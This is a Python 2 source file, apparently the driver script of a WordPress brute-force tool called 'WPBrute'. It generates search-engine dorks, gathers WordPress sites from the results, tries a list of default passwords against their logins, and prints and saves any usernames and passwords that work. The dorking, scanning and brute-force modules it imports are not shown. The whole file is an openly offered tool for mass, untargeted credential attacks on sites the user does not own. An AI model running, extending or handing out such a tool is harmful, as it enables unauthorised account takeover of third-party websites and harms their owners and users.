#!/usr/bin/env python2
# -*- coding: utf-8 -*-
#
#

"""
Wordpress brute force tool with dork maker and dork scanner.
"""

__author__ = "Black Viking"
__date__   = "16.04.2017"

import os
import sys
import time

sys.path.append("./source")

import dorkMaker
import dorkScanner
import bruteForce

def logo():
	logo = """
 __      ______________________                __          
/  \    /  \______   \______   \_______ __ ___/  |_  ____  
\   \/\/   /|     ___/|    |  _/\_  __ \  |  \   __\/ __ \ 
 \        / |    |    |    |   \ |  | \/  |  /|  | \  ___/ 
  \__/\  /  |____|    |______  / |__|  |____/ |__|  \___  >
       \/                    \/                         \/ 

\t\t\t\tVersion 1.0.0
\t\t\t\tCoded by Black Viking
\t\t\t\thttp://github.com/blackvkng"""
	print logo

def help():
	help = """
    Commands:
        generate dork 15    : Generate 15 dork, with random words.
        scan dorks 5        : Find 5 site for a dork (5 dork and 5 site ==> ~25 site)
        show passwords      : Show default passwords.
        show dorks          : Show generated dorks.
        show sites          : Show found sites from dorks.
        start               : Start to brute!
"""	
	print help

def clear():
	if os.name == "nt": os.system("cls")
	else: os.system("clear")

def main():
	global dorks, sites

	while True:
		wpb = raw_input("\nwpb => ").lower()

		if wpb == "help":
			help()

		elif wpb == "exit":
			sys.exit()

		elif wpb == "clear":
			clear()

		elif wpb == "show passwords":
			print "-"*60
			for pwd in bruteForce.passwords:
				print "  "+pwd
			print "-"*60
			print "[*] There are %s password!"%(len(bruteForce.passwords))

		elif "generate dork" in wpb:
			try:
				num = int(wpb.split()[-1])
			except ValueError:
				print "[-] Example Usage: generate dork 5"
				main()

			dorkMaker.dorks = [] # ^^
			dorkMaker.generateDork(num)
			print "[*] Generated %s dork!"%(len(dorkMaker.dorks))

		elif wpb == "show dorks":
			if len(dorkMaker.dorks) != 0:
				print "-"*60
				for dork in dorkMaker.dorks:
					print "  "+dork
				print "-"*60
				print "[*] There are %s dork!"%(len(dorkMaker.dorks))
			
			else:
				print "[-] No dorks to show!"


		elif "scan dorks" in wpb:
			try:
				num = int(wpb.split()[-1])
			except ValueError:
				print "[-] Example Usage: scan dorks 5"
				main()

			if len(dorkMaker.dorks) != 0:
				dorkScanner.sites = [] #^^
				print "\n[*] Scan started!"
				forBar = 0
				barLen = 50.0
				for dork in dorkMaker.dorks:
					sys.stdout.write("\r[%s%s | %d%%]"%('='*int(forBar), " "*int(barLen - forBar), int(forBar * 2)))
					sys.stdout.flush()
					dorkScanner.getSites(dork, num)
					forBar += barLen / len(dorkMaker.dorks)
				print "\r[%s | 100%%]"%("="*50)
				
				print "\n[+] Found %s site!"%(len(dorkScanner.sites))

			else:
				print "[-] No dorks to scan!"

		elif wpb == "show sites":
			if len(dorkScanner.sites) != 0:
				print "-"*60
				for site in dorkScanner.sites:
					print "  "+site
				print "-"*60
				print "[*] There are %s site!"%(len(dorkScanner.sites))

			else:
				print "[-] No sites to show!"

		elif wpb == "start":
			if len(dorkScanner.sites) != 0:
				test             = 0
				forBar           = 0
				barLen           = 50.0
				bruteForce.found = []
				print "[+] Brute force attack started!"
				print "[+] Check %s for found sites!\n"%(os.getcwdu()+os.sep+"found.txt")
				for site in dorkScanner.sites:
					sys.stdout.write("\r[%s%s | %d%% | Found Sites: %s | Tested: %s/%s ]"%('='*int(forBar), " "*int(barLen - forBar), int(forBar * 2), len(bruteForce.found), test, len(dorkScanner.sites)))
					sys.stdout.flush()
					bruteForce.brute(site)
					forBar += barLen / len(dorkScanner.sites)
					test   += 1
				print "\r[%s | 100%% | Found sites: %s | Tested: %s/%s]"%("="*50, len(bruteForce.found), len(dorkScanner.sites), len(dorkScanner.sites))

				found = bruteForce.found
				if len(found) != 0:
					for f in found:
						print "\n[+] Site: %s"%(f[0])
						print "    [+] Username: %s"%(f[1])
						print "    [+] Password: %s"%(f[2])
				else:
					print "\n[-_-] I could not find anything."

			else:
				print "[-] No sites to brute!"

		else:
			pass

if __name__ == "__main__":
	logo()
	main()
